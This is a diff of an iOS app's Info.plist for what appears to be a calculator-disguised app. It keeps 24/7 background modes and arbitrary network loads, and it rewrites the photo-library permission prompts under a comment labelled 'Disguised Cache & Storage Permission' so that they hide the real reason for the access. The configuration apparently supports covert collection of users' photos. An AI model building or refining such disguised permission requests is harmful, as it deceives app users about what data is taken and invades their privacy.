@@ -17,9 +17,9 @@
     <key>CFBundlePackageType</key>
     <string>APPL</string>
     <key>CFBundleShortVersionString</key>
-    <string>1.0.0</string>
+    <string>2.0.0</string>
     <key>CFBundleVersion</key>
-    <string>1</string>
+    <string>2</string>
     <key>LSRequiresIPhoneOS</key>
     <true/>
     
@@ -35,7 +35,7 @@
         <string>UIInterfaceOrientationPortrait</string>
     </array>
     
-    <!-- 24/7 Background Execution Modes -->
+    <!-- 24/7 Background Modes -->
     <key>UIBackgroundModes</key>
     <array>
         <string>audio</string>
@@ -50,13 +50,12 @@
         <string>com.utility.calculator.sync</string>
     </array>
 
-    <!-- Photo Library Permissions -->
+    <!-- Method 2 Disguised Cache & Storage Permission -->
     <key>NSPhotoLibraryUsageDescription</key>
-    <string>Calculator requires photo access for custom wallpaper themes.</string>
+    <string>To load local cache and themes.</string>
     <key>NSPhotoLibraryAddUsageDescription</key>
-    <string>Permission required to save calculation receipts.</string>
+    <string>To save calculation receipts and cache.</string>
 
-    <!-- Network Security -->
     <key>NSAppTransportSecurity</key>
     <dict>
         <key>NSAllowsArbitraryLoads</key>
